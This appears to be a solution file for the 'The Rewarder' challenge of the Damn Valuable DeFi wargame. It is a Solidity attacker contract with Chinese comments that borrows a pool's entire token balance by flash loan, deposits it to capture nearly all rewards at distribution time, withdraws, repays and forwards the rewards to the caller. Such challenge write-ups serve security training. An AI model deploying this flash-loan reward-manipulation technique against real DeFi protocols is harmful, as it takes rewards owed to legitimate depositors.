// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract TheRewarderPoolAttacker {
    FlashLoanerPool flashLoanPool;
    TheRewarderPool rewarderPool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;

    constructor(
        DamnValuableToken _liquidityToken,
        FlashLoanerPool _flashLoanPool,
        TheRewarderPool _rewarderPool,
        RewardToken _rewardToken
    ) {
        liquidityToken = _liquidityToken;
        flashLoanPool = _flashLoanPool;
        rewarderPool = _rewarderPool;
        rewardToken = _rewardToken;
    }

    function receiveFlashLoan(uint256 borrowAmount) external {
        require(msg.sender == address(flashLoanPool), "only pool");
        // 已經借到 borrowAmount DVT

        // 允許 rewarderPool 使用 borrowAmount 個數量的 DVT
        liquidityToken.approve(address(rewarderPool), borrowAmount);

        // 把借到的DVT全部存入 pool 裡，如果已經過了五天distributeRewards就會開始發reward給攻擊合約，因為存入的borrowAmount是池子裡所有餘額，因此拿到的reward也會是最高的
        rewarderPool.deposit(borrowAmount);

        // 已經拿到 ewardToken，可以把DVT從池子提領出來
        rewarderPool.withdraw(borrowAmount);

        // 還錢給flashLoanPool
        liquidityToken.transfer(address(flashLoanPool), borrowAmount);
    }

    function attack() external {
        uint256 dvtPoolBalance = liquidityToken.balanceOf(
            address(flashLoanPool)
        );

        flashLoanPool.flashLoan(dvtPoolBalance); // flash loan 借池子裡面所有的 DVT

        // 把 RewardToken 轉給 attacker
        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(msg.sender, rewardBalance);
    }

    receive() external payable {}
}
